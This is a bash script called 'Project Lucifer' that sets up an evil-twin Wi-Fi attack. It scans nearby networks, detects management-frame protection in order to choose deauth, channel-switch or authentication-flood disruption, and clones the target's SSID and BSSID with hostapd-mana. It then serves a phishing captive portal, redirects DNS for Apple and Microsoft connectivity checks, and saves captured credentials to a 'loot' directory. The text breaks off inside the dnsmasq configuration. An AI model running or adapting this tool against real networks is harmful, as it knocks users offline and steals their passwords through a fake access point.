#!/bin/bash

# ==========================================
# PROJECT LUCIFER
# Dual-Band + Mana + CSA + Auth Flood
# ==========================================

# --- CONFIGURATION ---
LUCIFER_HOME="${LUCIFER_HOME:-$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)}"
TEMPLATE_BASE="${LUCIFER_TEMPLATE_DIR:-$LUCIFER_HOME/portals}"
PORTAL_DIR="/tmp/evil_portal"
SCAN_FILE="/tmp/lucifer_scan"
CREDS_LOG="/tmp/creds.txt"
PMF_ENABLED=0
IS_MESH=0
CLONED_BSSID=0
SECURITY_MODE="OPEN"
PORTAL_IP="192.168.4.1"
PORTAL_SUBNET="192.168.4"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SESSION_LOG="${LUCIFER_OUTPUT_DIR:-$LUCIFER_HOME/loot}/session_$(date +%Y%m%d_%H%M%S).log"
AUTH_FLOOD=1

# --- COLORS ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# --- LOGGING ---
VERBOSITY="${LUCIFER_VERBOSITY:-1}"

log() {
    local level="$1"
    shift
    local msg="$*"
    local timestamp
    timestamp=$(date '+%H:%M:%S')

    # Always write to session log
    echo "[$timestamp] [$level] $msg" >> "$SESSION_LOG" 2>/dev/null

    case "$level" in
        ERROR)
            echo -e "${RED}[!] $msg${NC}" ;;
        WARN)
            echo -e "${YELLOW}[!] $msg${NC}" ;;
        INFO)
            echo -e "${GREEN}[+] $msg${NC}" ;;
        STATUS)
            echo -e "${BLUE}[*] $msg${NC}" ;;
        DEBUG)
            [ "$VERBOSITY" -ge 2 ] && \
                echo -e "${CYAN}[d] $msg${NC}" ;;
    esac
}

# --- PID TRACKING ---
declare -a SPAWNED_PIDS=()

track_pid() {
    SPAWNED_PIDS+=("$1")
}

pre_cleanup() {
    if systemctl is-active --quiet tailscaled 2>/dev/null; then
    echo -e "${YELLOW}[!] Tailscale is running. Its iptables rules will conflict with this tool.${NC}"
    echo -e "${YELLOW}[!] Stop it before proceeding: systemctl stop tailscaled${NC}"
    echo -e "${YELLOW}[!] If you use Tailscale for remote access, stop it from your remote session LAST.${NC}"
    exit 1
    fi
    echo -e "${BLUE}[*] Killing stale processes from previous runs...${NC}"
    killall -9 hostapd-mana hostapd dnsmasq 2>/dev/null
    pkill -9 -f lucifer_portal.py 2>/dev/null
    pkill -9 -f lucifer_csa.py 2>/dev/null
    sleep 1
}

_cleanup_processes() {
    for pid in "${SPAWNED_PIDS[@]}"; do
        kill -- -"$pid" 2>/dev/null
        kill "$pid" 2>/dev/null
        wait "$pid" 2>/dev/null
    done

    killall -q airodump-ng hostapd hostapd-mana dnsmasq mdk4 xterm 2>/dev/null
    pkill -f lucifer_portal.py 2>/dev/null
    pkill -f lucifer_csa.py 2>/dev/null

    iptables --flush 2>/dev/null
    iptables -t nat --flush 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
}

_cleanup_save_artifacts() {
    local output_dir="${LUCIFER_OUTPUT_DIR:-$LUCIFER_HOME/loot}"
    mkdir -p "$output_dir" 2>/dev/null

    if [ -f "$CREDS_LOG" ] && [ -s "$CREDS_LOG" ]; then
        local timestamp
        timestamp=$(date +%Y%m%d_%H%M%S)
        local dest="$output_dir/creds_$timestamp.txt"
        cp "$CREDS_LOG" "$dest" 2>/dev/null || \
            cp "$CREDS_LOG" "/tmp/creds_$timestamp.txt"
        echo -e "${GREEN}[+] Credentials saved to $dest${NC}"
    fi

    if [ -f "$SESSION_LOG" ]; then
        echo -e "${GREEN}[+] Session log: $SESSION_LOG${NC}"
    fi
}

_cleanup_filesystem() {
    rm -rf "$PORTAL_DIR" /tmp/hostapd.conf /tmp/dnsmasq.conf \
        /tmp/target.txt ${SCAN_FILE}* /tmp/networks.temp \
        /tmp/networks.sorted /tmp/hostapd.log /tmp/portal.log \
        /tmp/dnsmasq.log /tmp/pmf_check* "$CREDS_LOG" 2>/dev/null

    rm -f /tmp/target_ch*.txt /tmp/target_pincer_primary.txt \
        /tmp/target_suppress_ch*.txt /tmp/.pincer_target_ch 2>/dev/null

    if [ -n "$AP_IFACE" ]; then
        ip link set "$AP_IFACE" down 2>/dev/null
        ip addr flush dev "$AP_IFACE" 2>/dev/null
    fi
}

cleanup() {
    echo -e "\n${YELLOW}[*] Shutting down Lucifer...${NC}"

    _cleanup_processes
    _cleanup_save_artifacts
    _cleanup_filesystem

    echo -e "${GREEN}[*] Cleanup complete.${NC}"
    exit 0
}

trap cleanup INT TERM EXIT

# --- INTRO ---
show_intro() {
    clear
    echo -e "${RED}"
    cat << "EOF"

@@@       @@@  @@@   @@@@@@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@
@@@       @@@  @@@  @@@@@@@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@
@@!       @@!  @@@  !@@       @@!  @@!       @@!       @@!  @@@
!@!       !@!  @!@  !@!       !@!  !@!       !@!       !@!  @!@
@!!       @!@  !@!  !@!       !!@  @!!!:!    @!!!:!    @!@!!@!
!!!       !@!  !!!  !!!       !!!  !!!!!:    !!!!!:    !!@!@!
!!:       !!:  !!!  :!!       !!:  !!:       !!:       !!: :!!
 :!:      :!:  !:!  :!:       :!:  :!:       :!:       :!:  !:!
 :: ::::  ::::: ::   ::: :::   ::   ::        :: ::::  ::   :::
: :: : :   : :  :    :: :: :  :     :        : :: ::    :   : :

            [ EVIL CLONE / CAPTIVE PORTAL SUITE ]

EOF
    echo -e "${NC}"
    sleep 1
    clear
}

# --- CHECKS ---
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Run as root.${NC}"
        exit 1
    fi
}

check_deps() {
    local missing=()

	for cmd in airmon-ng airodump-ng mdk4 hostapd-mana dnsmasq xterm iw tcpdump tshark; do
        if ! command -v "$cmd" &>/dev/null; then
            missing+=("$cmd")
        fi
    done

    if ! python3 -c "from scapy.all import sendp" &>/dev/null; then
        missing+=("python3-scapy")
    fi

    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}[!] Missing dependencies: ${missing[*]}${NC}"
        echo -e "${YELLOW}    Install scapy: pip3 install scapy${NC}"
        exit 1
    fi

    if [ ! -f "$SCRIPT_DIR/lucifer_csa.py" ]; then
        echo -e "${RED}[!] Missing: lucifer_csa.py (must be in same directory as this script)${NC}"
        exit 1
    fi
    if [ ! -f "$SCRIPT_DIR/lucifer_portal.py" ]; then
        echo -e "${RED}[!] Missing: lucifer_portal.py (must be in same directory as this script)${NC}"
        exit 1
    fi

    echo -e "${GREEN}[+] All dependencies satisfied.${NC}"
}

# --- INTERFACE DETECTION ---

_detect_wireless_interfaces() {
    declare -ga DETECTED_IFACES=()
    declare -gA IFACE_DRIVER=()
    declare -gA IFACE_MAC=()
    declare -gA IFACE_MODE=()
    declare -gA IFACE_PHY=()

    for iface in $(iw dev 2>/dev/null | awk '/Interface/{print $2}'); do
        local driver="unknown"
        local mac="unknown"
        local mode="unknown"
        local phy="unknown"

        # Driver
        if [ -L "/sys/class/net/$iface/device/driver" ]; then
            driver=$(basename "$(readlink -f \
                "/sys/class/net/$iface/device/driver")")
        fi

        # MAC
        if [ -f "/sys/class/net/$iface/address" ]; then
            mac=$(cat "/sys/class/net/$iface/address")
        fi

        # Mode
        mode=$(iw dev "$iface" info 2>/dev/null \
            | awk '/type/{print $2}')

        # PHY
        phy=$(iw dev "$iface" info 2>/dev/null \
            | awk '/wiphy/{print "phy"$2}')

        DETECTED_IFACES+=("$iface")
        IFACE_DRIVER["$iface"]="$driver"
        IFACE_MAC["$iface"]="$mac"
        IFACE_MODE["$iface"]="$mode"
        IFACE_PHY["$iface"]="$phy"
    done
}

_print_detected_interfaces() {
    echo ""
    echo -e "${BLUE}[*] Detected wireless interfaces:${NC}"
    echo "------------------------------------------------------------"
    printf "%-4s %-14s %-12s %-10s %-20s\n" \
        "ID" "INTERFACE" "DRIVER" "MODE" "MAC"
    echo "------------------------------------------------------------"

    local i=1
    for iface in "${DETECTED_IFACES[@]}"; do
        printf "%-4s %-14s %-12s %-10s %-20s\n" \
            "$i" \
            "$iface" \
            "${IFACE_DRIVER[$iface]}" \
            "${IFACE_MODE[$iface]}" \
            "${IFACE_MAC[$iface]}"
        (( i++ ))
    done

    echo "------------------------------------------------------------"
}

_select_interface() {
    local role="$1"
    local exclude1="${2:-}"
    local exclude2="${3:-}"

    while true; do
        read -p "  Assign $role [1-${#DETECTED_IFACES[@]}]: " choice

        if ! [[ "$choice" =~ ^[0-9]+$ ]] \
            || [ "$choice" -lt 1 ] \
            || [ "$choice" -gt "${#DETECTED_IFACES[@]}" ]; then
            echo -e "${RED}  Invalid selection.${NC}"
            continue
        fi

        local selected="${DETECTED_IFACES[$((choice-1))]}"

        if [ "$selected" = "$exclude1" ] \
            || [ "$selected" = "$exclude2" ]; then
            echo -e "${RED}  Already assigned to another role.${NC}"
            continue
        fi

        echo "$selected"
        return
    done
}

_validate_monitor_capable() {
    local iface="$1"
    local phy="${IFACE_PHY[$iface]}"

    if [ -z "$phy" ] || [ "$phy" = "unknown" ]; then
        return 1
    fi

    if iw phy "$phy" info 2>/dev/null \
        | grep -A 8 "Supported interface modes" \
        | grep -q "monitor"; then
        return 0
    fi

    return 1
}

_validate_ap_capable() {
    local iface="$1"
    local phy="${IFACE_PHY[$iface]}"

    if [ -z "$phy" ] || [ "$phy" = "unknown" ]; then
        return 1
    fi

    if iw phy "$phy" info 2>/dev/null \
        | grep -A 8 "Supported interface modes" \
        | grep -q "AP"; then
        return 0
    fi

    return 1
}

_unmanage_interface() {
    local iface="$1"

    if command -v nmcli &>/dev/null; then
        nmcli device set "$iface" managed no 2>/dev/null
    fi
}

# --- INTERFACES ---
setup_interfaces() {
    echo -e "${BLUE}[*] Detecting interfaces...${NC}"

    _detect_wireless_interfaces

    if [ ${#DETECTED_IFACES[@]} -lt 3 ]; then
        echo -e "${RED}[!] Found ${#DETECTED_IFACES[@]} wireless interface(s). Need at least 3.${NC}"
        exit 1
    fi

    # Check for env var overrides
    local env_complete=0
    if [ -n "${LUCIFER_MON_TARGET:-}" ] \
        && [ -n "${LUCIFER_MON_SUPPRESS:-}" ] \
        && [ -n "${LUCIFER_AP:-}" ]; then

        # Validate all three exist in detected list
        local all_found=1
        for var in "$LUCIFER_MON_TARGET" "$LUCIFER_MON_SUPPRESS" "$LUCIFER_AP"; do
            local found=0
            for iface in "${DETECTED_IFACES[@]}"; do
                [ "$iface" = "$var" ] && found=1 && break
            done
            if [ "$found" -eq 0 ]; then
                echo -e "${YELLOW}[!] Env interface $var not found. Falling back to interactive.${NC}"
                all_found=0
                break
            fi
        done

        if [ "$all_found" -eq 1 ]; then
            MON_TARGET="$LUCIFER_MON_TARGET"
            MON_SUPPRESS="$LUCIFER_MON_SUPPRESS"
            AP_IFACE="$LUCIFER_AP"
            env_complete=1
            echo -e "${GREEN}[+] Using env vars: MON=$MON_TARGET SUP=$MON_SUPPRESS AP=$AP_IFACE${NC}"
        fi
    fi

    # Interactive selection if env vars not set or invalid
    if [ "$env_complete" -eq 0 ]; then
        _print_detected_interfaces

        echo ""
        echo -e "${BLUE}[*] Assign roles:${NC}"
        MON_TARGET=$(_select_interface "Target monitor")
        MON_SUPPRESS=$(_select_interface "Suppression monitor" "$MON_TARGET")
        AP_IFACE=$(_select_interface "Rogue AP" "$MON_TARGET" "$MON_SUPPRESS")
    fi

    # Validate capabilities
    if ! _validate_monitor_capable "$MON_TARGET"; then
        echo -e "${RED}[!] $MON_TARGET does not support monitor mode.${NC}"
        exit 1
    fi
    if ! _validate_monitor_capable "$MON_SUPPRESS"; then
        echo -e "${RED}[!] $MON_SUPPRESS does not support monitor mode.${NC}"
        exit 1
    fi
    if ! _validate_ap_capable "$AP_IFACE"; then
        echo -e "${RED}[!] $AP_IFACE does not support AP mode.${NC}"
        exit 1
    fi

    # Release only assigned interfaces from NetworkManager
    _unmanage_interface "$MON_TARGET"
    _unmanage_interface "$MON_SUPPRESS"
    _unmanage_interface "$AP_IFACE"
    sleep 1

    # Uplink connectivity
    UPLINK_IFACE="${LUCIFER_UPLINK:-}"
    if [ -z "$UPLINK_IFACE" ]; then
        for iface in $(ip -o link show | awk -F': ' '{print $2}'); do
            case "$iface" in
                lo|"$MON_TARGET"|"$MON_SUPPRESS"|"$AP_IFACE") continue ;;
            esac
            if ip link show "$iface" 2>/dev/null | grep -q "state UP"; then
                UPLINK_IFACE="$iface"
                break
            fi
        done
    fi

    if [ -n "$UPLINK_IFACE" ]; then
        dhclient "$UPLINK_IFACE" 2>/dev/null
    else
        echo -e "${YELLOW}[!] No wired uplink detected. Portal-only mode.${NC}"
    fi

    # Configure monitor interfaces
    ip link set "$MON_TARGET" down
    iw dev "$MON_TARGET" set type monitor
    ip link set "$MON_TARGET" up

    ip link set "$MON_SUPPRESS" down
    iw dev "$MON_SUPPRESS" set type monitor
    ip link set "$MON_SUPPRESS" up

    # AP interface — managed + down, hostapd takes over
    ip link set "$AP_IFACE" down
    iw dev "$AP_IFACE" set type managed
    sleep 0.3

    echo -e "${GREEN}[+] Target: $MON_TARGET | Suppress: $MON_SUPPRESS | AP: $AP_IFACE${NC}"
}

# --- PMF DETECTION ---
check_pmf() {
    local bssid="$1"
    local channel="$2"
    local cap_prefix="/tmp/pmf_check_$$"
    local cap_file="${cap_prefix}-01.cap"

    echo -e "${BLUE}[*] Checking PMF status on target...${NC}"
    rm -f "${cap_prefix}"-* 2>/dev/null

    airodump-ng \
        --bssid "$bssid" \
        -c "$channel" \
        --write "$cap_prefix" \
        --output-format pcap \
        "$MON_TARGET" &>/dev/null &

    local dump_pid=$!

    sleep 2
    for i in 1 2 3; do
        aireplay-ng -9 -a "$bssid" "$MON_TARGET" &>/dev/null &
        local probe_pid=$!
        sleep 2
        kill "$probe_pid" 2>/dev/null
    done
    sleep 2

    kill "$dump_pid" 2>/dev/null
    sleep 1
    kill -0 "$dump_pid" 2>/dev/null && kill -9 "$dump_pid" 2>/dev/null
    wait "$dump_pid" 2>/dev/null

    if [[ ! -s "$cap_file" ]]; then
        echo -e "${RED}[-] No capture data. Assuming PMF required — safe mode.${NC}"
        rm -f "${cap_prefix}"-* 2>/dev/null
        PMF_ENABLED=2
        return
    fi

    local rsn_fields
    rsn_fields=$(tshark -r "$cap_file" \
        -Y "(wlan.fc.type_subtype == 0x08 || wlan.fc.type_subtype == 0x05) && wlan.sa == ${bssid}" \
        -T fields \
        -e wlan.rsn.capabilities.mfpr \
        -e wlan.rsn.capabilities.mfpc \
        2>/dev/null | head -1)

    rm -f "${cap_prefix}"-* 2>/dev/null

    local mfpr mfpc
    mfpr=$(echo "$rsn_fields" | cut -f1)
    mfpc=$(echo "$rsn_fields" | cut -f2)

    # Normalize — handle both "1"/"0" and "True"/"False"
    [[ "$mfpr" == "True" ]] && mfpr="1"
    [[ "$mfpc" == "True" ]] && mfpc="1"
    [[ "$mfpr" == "False" ]] && mfpr="0"
    [[ "$mfpc" == "False" ]] && mfpc="0"

    if [[ "$mfpr" == "1" ]]; then
        echo -e "${YELLOW}[!] PMF REQUIRED — deauth frames will be dropped.${NC}"
        echo -e "${YELLOW}    Using CSA + Auth Flood as primary vectors.${NC}"
        PMF_ENABLED=2
    elif [[ "$mfpc" == "1" ]]; then
        echo -e "${YELLOW}[!] PMF CAPABLE — mixed deauth + CSA strategy.${NC}"
        PMF_ENABLED=1
    elif [[ -n "$rsn_fields" ]]; then
        echo -e "${GREEN}[+] PMF not advertised — standard deauth viable.${NC}"
        PMF_ENABLED=0
    else
        echo -e "${RED}[-] RSN parse failed. Assuming PMF required — safe mode.${NC}"
        PMF_ENABLED=2
    fi
}

set_regulatory_domain() {
    echo -e "${BLUE}[*] Setting regulatory domain to US...${NC}"
    # Kill interfering processes first, but maintain eth0 for portal internet gateway.
    airmon-ng check kill >/dev/null 2>&1

    ip addr flush dev eth0
    dhcpcd -b eth0 2>/dev/null
    sleep 3

    # Set to US
    iw reg set US
    sleep 1
}

# --- SCANNING HELPERS ---
_parse_networks() {
    local csv_file="$1"
    [ -z "$csv_file" ] || [ ! -f "$csv_file" ] && return 1

    unset CLIENT_COUNTS
    declare -gA CLIENT_COUNTS
    local in_client=0
    while IFS= read -r line; do
        if echo "$line" | grep -q "Station MAC"; then in_client=1; continue; fi
        if [ $in_client -eq 1 ]; then
            local cb
            cb=$(echo "$line" | awk -F',' '{print $6}' | tr -d '[:space:]')
            [[ "$cb" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && \
                CLIENT_COUNTS[$cb]=$(( ${CLIENT_COUNTS[$cb]:-0} + 1 ))
        fi
    done < "$csv_file"

    rm -f /tmp/networks.temp
    while IFS=, read -r bssid first last channel speed privacy cipher auth power beacon iv lanip idlen essid key; do
        bssid=$(echo "$bssid" | tr -d '[:space:]')
        power=$(echo "$power" | tr -d '[:space:]')
        channel=$(echo "$channel" | tr -d '[:space:]')
        essid=$(echo "$essid" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')

        [[ ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && continue
        [[ "$power" == "-1" || -z "$power" ]] && continue
        [[ -z "$essid" ]] && essid="<hidden>"

        local band="2.4G"
        [[ "$channel" -gt 14 ]] 2>/dev/null && band=" 5G "

        local count=${CLIENT_COUNTS[$bssid]:-0}
        echo "$count,$power,$bssid,$channel,$band,$essid" >> /tmp/networks.temp
    done < <(awk '/^[0-9A-Fa-f]{2}:/' "$csv_file")

    [ ! -f /tmp/networks.temp ] && return 1
    sort -t ',' -k1,1nr -k2,2nr /tmp/networks.temp > /tmp/networks.sorted
    return 0
}

_print_networks() {
    local elapsed="$1"
    clear
    echo -e "${BLUE}[*] Live Scan — ${elapsed}s | Press ENTER to stop (max 5min)${NC}"
    echo "----------------------------------------------------------------------------"
    printf "%-4s %-5s %-18s %-4s %-5s %-10s %-30s\n" "ID" "PWR" "BSSID" "CH" "BAND" "CLIENTS" "ESSID"
    echo "----------------------------------------------------------------------------"
    local j=1
    while IFS=, read -r count power bssid channel band essid; do
        local c_color
        [ "$count" -gt 0 ] && c_color="${GREEN}${count}${NC}" || c_color="${RED}0${NC}"
        printf "%-4s %-5s %-18s %-4s %-5s %-16b %-30s\n" \
            "$j" "$power" "$bssid" "$channel" "$band" "$c_color" "$essid"
        (( j++ ))
    done < /tmp/networks.sorted
    echo "----------------------------------------------------------------------------"
}

# --- SCANNING ---
scan_networks() {
    rm -f ${SCAN_FILE}*

    airodump-ng --band abg --write "$SCAN_FILE" \
        --output-format csv "$MON_TARGET" >/dev/null 2>&1 &
    SCAN_PID=$!

    local elapsed=0
    local max=300
    while [ $elapsed -lt $max ]; do
        # read -t 3 waits 3s for Enter; returns 0 (break) if pressed, 1 if timeout
        if read -r -t 3 -s; then break; fi
        (( elapsed += 3 ))
        local csv_file
        csv_file=$(ls ${SCAN_FILE}*.csv 2>/dev/null | head -n 1)
        _parse_networks "$csv_file" && _print_networks "$elapsed"
    done

    kill "$SCAN_PID" 2>/dev/null
    wait "$SCAN_PID" 2>/dev/null

    CSV=$(ls ${SCAN_FILE}*.csv 2>/dev/null | head -n 1)
    if [ -z "$CSV" ] || [ ! -f /tmp/networks.sorted ]; then
        echo -e "${RED}[!] No scan data captured.${NC}"
        exit 1
    fi

    # Populate TARGETS from final sorted results
    declare -gA TARGETS
    local i=1
    while IFS=, read -r count power bssid channel band essid; do
        TARGETS[$i]="$bssid|$essid|$channel"
        (( i++ ))
    done < /tmp/networks.sorted
    rm -f /tmp/networks.temp /tmp/networks.sorted

    read -p "Select Target ID: " choice
    IFS='|' read -r T_BSSID T_ESSID T_CH <<< "${TARGETS[$choice]}"

    if [ -z "$T_BSSID" ]; then
        echo -e "${RED}[!] Invalid selection.${NC}"
        exit 1
    fi

    echo -e "${GREEN}[+] Target: $T_ESSID ($T_BSSID) on CH $T_CH${NC}"

    check_pmf "$T_BSSID" "$T_CH"
}

# --- ADVANCED MESH & HARDWARE SIBLING DETECTION ---
collect_mesh_siblings() {
    echo -e "${BLUE}[*] Deep Scan: Mapping Mesh Nodes & Hardware Siblings...${NC}"

    CSV=$(ls ${SCAN_FILE}*.csv 2>/dev/null | head -n 1)
    if [ -z "$CSV" ]; then
        echo -e "${YELLOW}[!] No scan data. Attacking single BSSID only.${NC}"
        MESH_TARGETS=("$T_CH:$T_BSSID")
        MESH_CHANNELS=("$T_CH")
        return
    fi

    # 1. Define Target Fingerprints
    local t_bssid_clean=$(echo "$T_BSSID" | tr -d '[:space:]')

    # Extract Bytes 2-5 (e.g. from AA:BB:CC:DD:EE:FF -> BB:CC:DD:EE)
    # This ignores the first byte (OUI/Local Bit) and last byte (Interface ID)
    local t_middle=$(echo "$t_bssid_clean" | cut -d: -f2-5)

    # Get target signal power
    local t_power=$(grep "$t_bssid_clean" "$CSV" | head -1 | awk -F, '{print $9}' | tr -d ' ')

    declare -gA MESH_CH_MAP
    declare -ga MESH_TARGETS=()
    declare -ga MESH_CHANNELS=()

    echo -e "${DIM}    Target Base: $T_BSSID ($T_ESSID) | CH:$T_CH | PWR:$t_power${NC}"

    # Read CSV
    while IFS=, read -r bssid first last channel speed privacy cipher auth power beacon iv lanip idlen essid key; do
        bssid=$(echo "$bssid" | tr -d '[:space:]')
        channel=$(echo "$channel" | tr -d '[:space:]')
        essid=$(echo "$essid" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        power=$(echo "$power" | tr -d '[:space:]')

        [[ ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && continue
        [[ "$power" == "-1" || -z "$power" ]] && continue

        local is_target=0
        local reason=""

        # --- CRITERIA 1: Same SSID (Mesh Node) ---
        if [ "$essid" = "$T_ESSID" ]; then
            is_target=1
            reason="Mesh Node"
        fi

        # --- CRITERIA 2: Hardware Sibling (Guest/IoT Network) ---
        if [ "$is_target" -eq 0 ]; then
            local current_middle=$(echo "$bssid" | cut -d: -f2-5)

            if [ "$current_middle" = "$t_middle" ]; then
                is_target=1
                reason="Hardware Sibling ($essid CH:$channel)"
            fi
        fi

        # Add to list
        if [ "$is_target" -eq 1 ]; then
            # Avoid duplicate entries
            local entry="$channel:$bssid"
            local seen=0
            for existing in "${MESH_TARGETS[@]}"; do
                if [ "$existing" == "$entry" ]; then seen=1; break; fi
            done

            if [ "$seen" -eq 0 ]; then
                MESH_TARGETS+=("$entry")
                MESH_CH_MAP[$channel]=1

                # Visual Feedback
                if [ "$reason" == "Mesh Node" ]; then
                     echo -e "    -> Found ${CYAN}$reason${NC}: $bssid (CH $channel)"
                elif [[ "$reason" == *"Sibling"* ]]; then
                     echo -e "    -> Found ${RED}$reason${NC}: $bssid (CH $channel)"
                fi
            fi
        fi

    done < <(awk -F, '/^[0-9A-Fa-f]{2}:/' "$CSV")

    # Extract unique channels
    for ch in "${!MESH_CH_MAP[@]}"; do
        MESH_CHANNELS+=("$ch")
    done
    IFS=$'\n' MESH_CHANNELS=($(sort -n <<<"${MESH_CHANNELS[*]}")); unset IFS

    if [ ${#MESH_TARGETS[@]} -eq 0 ]; then
         MESH_TARGETS=("$T_CH:$T_BSSID")
         MESH_CHANNELS=("$T_CH")
    fi

    IS_MESH=1
    echo -e "${YELLOW}[!] Attack Profile Loaded: ${#MESH_TARGETS[@]} BSSIDs across ${#MESH_CHANNELS[@]} channels${NC}"
    echo ""
}

# --- TEMPLATE SELECTION ---
select_template() {
    echo -e "\n${BLUE}[*] Available portals in $TEMPLATE_BASE:${NC}"
    echo "---------------------------------"

    local i=1
    shopt -s nullglob
    local dirs=("$TEMPLATE_BASE"/*/)
    shopt -u nullglob

    if [ ${#dirs[@]} -eq 0 ]; then
        echo -e "${YELLOW}[!] No templates found. Using built-in default.${NC}"
        SELECTED_TEMPLATE=""
        return
    fi

    for dir in "${dirs[@]}"; do
        echo -e " [$i] $(basename "$dir")"
        ((i++))
    done
    echo "---------------------------------"

    while true; do
        read -p "Select template: " t_choice
        if [[ "$t_choice" =~ ^[0-9]+$ ]] && [ "$t_choice" -ge 1 ] && [ "$t_choice" -le "${#dirs[@]}" ]; then
            SELECTED_TEMPLATE="${dirs[$((t_choice-1))]}"
            SELECTED_TEMPLATE="${SELECTED_TEMPLATE%/}"
            echo -e "${GREEN}[+] Template: $(basename "$SELECTED_TEMPLATE")${NC}"
            break
        fi
        echo -e "${RED}[!] Invalid. Try again.${NC}"
    done
}

# --- SECURITY MODE ---
select_security_mode() {
    echo -e "\n${BLUE}[*] Select attack mode:${NC}"
    echo " [1] OPEN (Phishing portal) — user must manually select AP"
    echo " [2] WPA2 (Clone with known PSK) — auto-join if PSK is correct"
    read -p "Select [1/2]: " sec_choice

    if [ "$sec_choice" == "2" ]; then
        SECURITY_MODE="WPA2"
        read -sp "Enter known password for $T_ESSID: " KNOWN_PASS
        echo ""
        if [ ${#KNOWN_PASS} -lt 8 ]; then
            echo -e "${RED}[!] WPA2 passphrase must be >= 8 characters.${NC}"
            exit 1
        fi
        echo -e "${GREEN}[+] Mode: WPA2 (auto-join enabled)${NC}"
    else
        SECURITY_MODE="OPEN"
        echo -e "${GREEN}[+] Mode: OPEN (phishing)${NC}"
    fi
}

# --- PORTAL SETUP ---
setup_portal() {
    rm -rf "$PORTAL_DIR"
    mkdir -p "$PORTAL_DIR"

    if [ -n "$SELECTED_TEMPLATE" ]; then
        # Copy the HTML template (ensure you saved the new index.html there)
        cp -r "$SELECTED_TEMPLATE"/* "$PORTAL_DIR/"

        # 1. Prepare the SSID for HTML injection
        # We escape ampersands (&) and backslashes (\) to prevent sed errors
        # We also sanitize HTML special chars (<, >, ") slightly to prevent broken HTML tags
        local safe_ssid
        safe_ssid=$(echo "$T_ESSID" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g')

        # 2. Escape slashes for the sed replacement command itself
        safe_ssid=$(echo "$safe_ssid" | sed 's/[\/&]/\\&/g')

        # 3. Replace {{SSID}} in all HTML files
        # We look for .html files now, not just .php
        find "$PORTAL_DIR" -type f -name "*.html" \
            -exec sed -i "s/{{SSID}}/$safe_ssid/g" {} +
    fi

    # Ensure creds log exists and is writable by the Python script
    touch "$CREDS_LOG"
    chmod 666 "$CREDS_LOG"
}

# --- CHANNEL SELECTION ---
select_rogue_channel() {
    if [ "$T_CH" -gt 14 ]; then
        HW_MODE="a"
        case $T_CH in
            36)  FAKE_CH=44  ;;
            40)  FAKE_CH=48  ;;
            44)  FAKE_CH=36  ;;
            48)  FAKE_CH=40  ;;
            52)  FAKE_CH=60  ;;
            56)  FAKE_CH=64  ;;
            60)  FAKE_CH=52  ;;
            64)  FAKE_CH=56  ;;
            149) FAKE_CH=157 ;;
            153) FAKE_CH=161 ;;
            157) FAKE_CH=149 ;;
            161) FAKE_CH=153 ;;
            165) FAKE_CH=149 ;;
            *)   FAKE_CH=36  ;;
        esac

        # Verify the AP adapter supports this channel
        if ! iw list 2>/dev/null | grep -q "\\* $FAKE_CH MHz" && \
           ! iw list 2>/dev/null | grep -q "\[$FAKE_CH\]"; then
            echo -e "${YELLOW}[!] AP adapter may not support CH $FAKE_CH. Falling back to CH 36.${NC}"
            FAKE_CH=36
        fi
    else
        HW_MODE="g"
        case $T_CH in
            1|2|3|4|5)     FAKE_CH=6  ;;
            6|7|8|9|10)    FAKE_CH=1  ;;
            11|12|13|14)   FAKE_CH=1  ;;
            *)             FAKE_CH=6  ;;
        esac
    fi

    echo -e "${CYAN}[*] Channel plan: Target CH $T_CH → Rogue CH $FAKE_CH (hw_mode=$HW_MODE)${NC}"
}

generate_hostapd_conf() {
    cat > /tmp/hostapd.conf << EOF
interface=$AP_IFACE
driver=nl80211
ssid=$T_ESSID
hw_mode=$HW_MODE
channel=$FAKE_CH
ieee80211n=1
wmm_enabled=1
# --- FIX: Aggressive Zombie Cleanup ---
disassoc_low_ack=1
ap_max_inactivity=30
skip_inactivity_poll=0
# --------------------------------------
EOF

    # Only set BSSID if MAC clone succeeded at the OS level.
    # If it failed, let hostapd use whatever MAC the driver has.
    # Passing a BSSID that the driver already rejected causes
    # hostapd to fail the same nl80211 SET_INTERFACE call.
    if [ "$CLONED_BSSID" -eq 1 ]; then
        echo "bssid=$T_BSSID" >> /tmp/hostapd.conf
    fi

    if [ "$SECURITY_MODE" == "WPA2" ]; then
        cat >> /tmp/hostapd.conf << EOF
enable_mana=0
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
wpa_passphrase=$KNOWN_PASS
EOF
    else
        cat >> /tmp/hostapd.conf << EOF
enable_mana=1
mana_wpe=0
mana_eapsuccess=0
mana_macacl=0
mana_loud=1
auth_algs=1
wpa=0
EOF
    fi
}

# --- DNSMASQ CONFIG ---
generate_dnsmasq_conf() {
    cat > /tmp/dnsmasq.conf << EOF
interface=$AP_IFACE
bind-interfaces
dhcp-range=${PORTAL_SUBNET}.10,${PORTAL_SUBNET}.200,255.255.255.0,4h

dhcp-option=3,${PORTAL_IP}
dhcp-option=6,${PORTAL_IP}

# RFC 8908 Captive Portal API (macOS Sonoma+, Android 11+, Windows 11)
dhcp-option=114,http://${PORTAL_IP}/api/captive

# WPAD (Windows proxy auto-discovery)
dhcp-option=252,"http://${PORTAL_IP}/wpad.dat"

# Apple CNA probe domains
address=/captive.apple.com/${PORTAL_IP}
address=/www.apple.com/${PORTAL_IP}
address=/apple.com/${PORTAL_IP}

# Microsoft NCSI probe domains
address=/msftconnecttest.com/${PORTAL_IP}
address=/www.msftconnecttest.com/${PORTAL_IP}
